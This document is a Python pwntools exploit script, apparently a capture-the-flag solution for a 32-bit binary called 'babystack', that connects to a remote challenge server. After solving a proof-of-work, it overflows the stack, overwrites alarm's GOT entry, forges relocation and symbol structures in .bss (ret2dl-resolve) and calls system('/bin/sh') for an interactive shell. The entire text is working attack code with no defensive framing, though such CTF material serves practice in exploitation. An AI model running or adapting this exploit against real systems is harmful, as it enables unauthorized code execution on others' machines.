from pwn import *
from hashlib import sha256
import sys

def pow_solver(chal):
    for i in xrange(0xffffffff):
        if sha256(chal + p32(i)).digest().startswith('\0\0\0'):
            p.send(p32(i))
            break

if len(sys.argv) == 1:
    p = process(["./babystack"])
#    p = process(["python", "./pow.py"])
#    chal = p.recvuntil("\n")[:-1]
#    print chal
#    pow_solver(chal)

else:
    p = remote("202.120.7.202", "6666")
    chal = p.recvuntil("\n")[:-1]
    print chal
    pow_solver(chal)


# alarm to system
# return to dl-resolve

pop3ret = 0x080484e9        # : pop esi; pop edi; pop ebp; ret;
pop1ebx = 0x080482e9        # : pop ebx ; ret
read = 0x8048300
read_got = 0x0804a00c
bss = 0x804a100
vuln = 0x804843b
alarm_got = 0x0804a010
alarm = 0x8048310
leaveret = 0x08048455
add_gadget = 0x0804840a     # : add ecx, ecx ; ret
main2 = 0x804846d

linker = 0x80482f0
dynsym = 0x80481cc
jmprel = 0x80482b0
strtab = 0x804822c

log.info("stage 1")
exp = "A" * 0x28 + "B" * 4
exp += p32(read) + p32(vuln) + p32(0) + p32(alarm_got) + p32(4)
p.send(exp)

log.info("Overwrite alarm@got to dl-resolve function")
p.send(p32(linker))

log.info("stage 2")
exp = "A" * 0x28 + "B" * 4
exp += p32(read) + p32(vuln) + p32(0) + p32(bss) + p32(0x1000)
p.send(exp)

log.info("fake struct set in bss section")
offset = (bss - jmprel)      # need to calculate
index = (bss + 0xc - dynsym) / 16       # need to calculate
alarm_string_offset = 0x1f      # .strtab_base + offset( in dynsym table )
fake_string_offset = bss + 36 - strtab
fake_linkmap = p32(alarm_got) + p32(7 + (index << 8)) + p32(0xdeadbeef)       # set JMPREL table
fake_dynsym = p32(fake_string_offset) + p32(0) * 2 + p32(12)       # have 6 members
padd = "/bin/sh\x00"      # bss + 0x100
padd2 = "system\x00"
p.sendline(fake_linkmap + fake_dynsym + padd + padd2)      # bss | bss + 8 | bss + 0x100

log.info("call alarm -> call system")
pop2ret = 0x080484ea        # : pop edi ; pop ebp ; ret
exp = "A" * 0x28 + "B" * 4
exp += p32(alarm) + p32(offset) + p32(0xdeadbeef) + p32(bss + 28)      # get system address
p.sendline(exp)
p.send("\x00" * 21)

p.interactive()
